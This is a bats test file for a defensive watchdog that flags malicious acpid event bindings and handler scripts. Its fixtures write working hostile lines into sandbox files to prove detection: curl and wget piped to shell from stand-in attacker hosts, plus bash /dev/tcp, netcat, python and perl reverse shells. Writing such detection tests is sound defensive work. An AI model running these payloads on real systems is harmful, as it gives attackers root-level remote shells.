#!/usr/bin/env bats
# L2 bats functional tests for the acpi-hooks-watchdog scan script.
#
# acpid runs the bound action AS ROOT on each ACPI hardware event (power
# button, lid, AC adapter, thermal): /etc/acpi/events/* bind an event to
# `action=<cmd>`, /etc/acpi/actions/* + /etc/acpi/*.sh are the handlers. A
# dropped handler — or a new binding whose `action=` points at attacker
# code — self-triggers on routine hardware activity (T1546).
#
# Notably this LOCKS the module-specific pattern SDD-061 D-6 preserved
# verbatim as a PATTERNS+=(...) extra — the acpid `action=<writable>`
# pattern (the path follows `=`, which the generic command-position rule
# misses) — proving the preserved extra still detects after migration.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# events dir + baseline in a tmp sandbox via SELFDEF_ACPI_*; locks the
# `"severity":"alert"` token SDD-062 routes on + the D-6 fail-loud path.
#
# Run with: bats packaging/test/L2-acpi-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd/acpi-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    EVENTS="${TMP}/events"; mkdir -p "${EVENTS}"
    BIND="${EVENTS}/powerbtn"
    NOGLOB="${TMP}/none/*.sh"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ACPI_PROFILE="${PROFILE:-report}" \
    SELFDEF_ACPI_BASELINE="${BASELINE}" \
    SELFDEF_ACPI_DIRS="${DIRS:-$EVENTS}" \
    SELFDEF_ACPI_GLOB="${NOGLOB}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no acpi hooks present → ok / no_acpi_hooks" {
    DIRS="${TMP}/empty-nonexistent" run_wd
    cap | grep -q '"event":"no_acpi_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign event binding, first run → ok / baseline_initial" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / acpi_hooks_intact" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"acpi_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — incl. the PRESERVED action= extra
# ============================================================

@test "event binding with action= under a writable root → alert (preserved extra)" {
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "event binding with a quoted writable action= → alert (preserved extra)" {
    printf 'event=ac_adapter\naction="/dev/shm/payload"\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "handler containing a curl|sh payload → alert (canonical pattern)" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign binding added after baseline → warn / acpi_hooks_changed" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    printf 'event=button/lid\naction=/etc/acpi/actions/lid.sh\n' > "${EVENTS}/lid"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"acpi_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "action= pointing under /etc/acpi is NOT flagged (no alert)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a commented-out writable action= line is NOT flagged" {
    printf 'event=button/power\n# action=/tmp/evil.sh\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — acpi-hooks inventory enumerates ACPI-event-trigger root-exec surface)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (action= under /var/tmp — preserved extra writable-root expansion)" {
    printf 'event=button/lid\naction=/var/tmp/.attacker.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action= under /home — user-writable preserved extra coverage)" {
    printf 'event=button/lid\naction=/home/user/.attacker.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (handler with /dev/tcp reverse shell): canonical reverse-shell pattern" {
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (handler with wget-pipe-sh): wget bootstrap" {
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (handler with base64-decode-pipe): obfuscation" {
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable event binding file → alert)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    chmod 0666 "${BIND}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-acpi-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): acpi-hooks-watchdog does NOT refresh baseline on suspicious-action detection — alert STAYS until operator updates" {
    # T1546 hardware-event-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in handler)" {
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multiple event bindings: ANY suspicious action= in any binding → alert)" {
    # An attacker may add a new binding alongside benign existing ones.
    # Lock that ANY suspicious binding triggers alert (not just the first).
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    printf 'event=button/lid\naction=/etc/acpi/actions/lid.sh\n' > "${EVENTS}/lid"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Add a suspicious third binding.
    printf 'event=thermal\naction=/tmp/.evil.sh\n' > "${EVENTS}/thermal"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in ACPI handler: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession nc
    # reverse-shell variant INVARIANTs across the brain. Lock the
    # netcat axis on the ACPI-event-trigger root-exec persistence
    # surface (T1546 — acpid runs handler scripts AS ROOT on every
    # ACPI event like power-button/lid-close/thermal — physical
    # operator gestures BECOME root exec triggers).
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on ACPI handler surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the ACPI-event-
    # trigger root-exec persistence surface (T1546 — acpid runs
    # handler scripts AS ROOT on every ACPI event like power-
    # button/lid-close/thermal — physical operator gestures
    # BECOME root exec triggers).
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on ACPI handler surface)" {
    # Sister to nc / python -c / bash -i / curl|sh / wget|sh / dev-tcp
    # / base64 reverse-shell variants already locked. Beyond those,
    # attackers reach for perl -e 'use Socket;...' as an interpreter
    # variant — Perl is installed on most Debian/Ubuntu systems as a
    # dependency of dpkg/locale tooling, and its `use Socket` family
    # produces a one-liner connect-back PTY just as cleanly as Python.
    # Locks the perl axis on the ACPI-event-trigger root-exec
    # persistence surface (T1546 — acpid runs handler scripts AS ROOT
    # on every ACPI event like power-button/lid-close/thermal —
    # physical operator gestures BECOME root exec triggers).
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");"\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named ACPI event binding surfaces in sample for operator-triage routing)" {
    # Sister to brain-wide DELTA-detect sample-naming INVARIANTs.
    # When an attacker drops a new acpid event-binding file in
    # the events.d dir (T1546 — ACPI-event-trigger root-exec
    # persistence), the binding NAME MUST surface in the JSON
    # sample so operator dashboard routes triage to the right
    # event-binding.
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${EVENTS}/distinctive-attacker-acpi-binding"
    run_wd
    cap | grep -q 'distinctive-attacker-acpi-binding'
}

@test "INVARIANT (exec-path under writable-root: ACPI action invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # ACPI-event-trigger root-exec persistence — acpid runs the
    # bound action AS ROOT on every power button / lid / battery
    # event. Beyond inline rev-shell payloads, attackers stage
    # benign-looking actions that invoke a binary in writable-
    # root.
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'event=button/power\naction=/tmp/staged_payload\n' > "${BIND}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on acpi-hooks surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The acpi-hooks-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 ACPI-event-trigger root-exec
    # persistence alert. Locks parser contract on the acpid
    # event-binding detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd                                              # ok / baseline
    printf 'event=button/power\naction=/tmp/.evil\n' > "${BIND}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: acpi-hooks-watchdog NEVER deletes acpi event bindings — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # acpi-hooks-watchdog DETECTS T1546 ACPI-event-trigger
    # root-exec persistence but MUST NEVER emit rm/unlink
    # commands to auto-clean the event binding. The detected
    # binding may be operator-legitimate (custom power-button
    # action, lid-close suspend script, battery-low warning).
    # Silent auto-delete would destroy operator baseline state
    # AND break operator's intended power-event handling.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the acpi-hooks surveillance substrate.
    printf 'event=button/power\naction=/tmp/.evil\n' > "${BIND}"
    run_wd
    [ -f "${BIND}" ]
    grep -q 'event=' "${BIND}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(BIND|EVENTS|FILE|file)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # acpi-hooks-watchdog runs ON the timer's scheduled fire —
    # scans /etc/acpi/events for action= injection patterns,
    # emits a verdict, then exits. Type=simple would break
    # timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the acpi-hooks-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd/selfdef-acpi-hooks.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. acpi-hooks-watchdog manifest declares install +
    # profile gating the resolver enforces; malformed manifest
    # wedges the /etc/acpi/events action= scanner baseline.
    # Python's tomllib is the canonical parser. Locks anti-
    # malformed-manifest on the acpi-hooks-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'acpi-hooks-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (acpi-hooks-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The acpi-hooks-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the acpi-hooks-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (acpi-hooks-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the acpi-hooks-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (acpi-hooks-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The acpi-hooks-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the acpi-hooks-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (acpi-hooks-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the acpi-hooks-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (acpi-hooks-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # acpi-hooks-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (acpi-hooks-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the acpi-hooks-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
